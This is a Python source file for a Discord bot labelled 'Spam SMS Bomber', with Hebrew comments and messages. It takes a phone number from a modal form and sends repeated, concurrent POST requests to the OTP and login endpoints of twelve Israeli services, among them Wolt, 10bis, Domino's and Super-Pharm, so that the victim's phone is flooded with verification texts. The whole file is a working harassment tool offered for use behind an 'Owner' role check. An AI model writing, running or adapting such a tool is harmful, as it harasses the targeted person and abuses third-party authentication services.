import discord
from discord import app_commands
from discord.ext import commands
import os
import httpx
import asyncio

# משיכת הטוקן מה-Environment של Render
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if not role:
            return await interaction.response.send_message("❌ רק Owner יכול להפעיל!", ephemeral=True)
        await interaction.response.send_modal(SpamModal())

class SpamModal(discord.ui.Modal, title="SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        phone_val = self.phone.value
        await interaction.response.send_message(f"💣 הפצצה על {phone_val} יוצאת לדרך...", ephemeral=True)
        
        endpoints = [
            {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
            {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
            {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
            {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
            {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
            {"url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}}
        ]

        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}

        async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
            for _ in range(2):
                tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(5)

        await interaction.followup.send(f"✅ ההפצצה על {phone_val} הסתיימה!", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        # מסנכרן את פקודות הסלאש (/) עם השרתים של דיסקורד
        await self.tree.sync()
        print("✅ Slash Commands Synced!")

bot = MyBot()

@bot.tree.command(name="setup", description="מפעיל את פאנל ההפצצה")
async def setup(interaction: discord.Interaction):
    role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
    if not role:
        return await interaction.response.send_message("❌ אין לך הרשאת Owner!", ephemeral=True)
    
    embed = discord.Embed(
        title="Spam SMS Bomber | Admin Panel",
        description="**👑 Owner Access Only**\nלחץ על הכפתור למטה כדי להתחיל.",
        color=discord.Color.red()
    )
    await interaction.response.send_message(embed=embed, view=SpamView())

if __name__ == "__main__":
    bot.run(TOKEN)
